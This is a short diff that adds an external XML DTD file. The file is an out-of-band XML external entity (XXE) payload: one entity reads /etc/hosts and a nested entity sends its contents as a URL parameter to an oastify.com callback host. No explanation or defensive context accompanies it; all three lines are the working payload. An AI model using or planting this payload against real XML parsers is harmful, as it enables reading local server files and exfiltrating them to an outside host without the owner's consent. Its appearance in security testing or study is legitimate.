@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://ecukk5k3jg3ci5dp0iyicli13s9jx9ly.oastify.com/?p=%file;'>">
+%all;
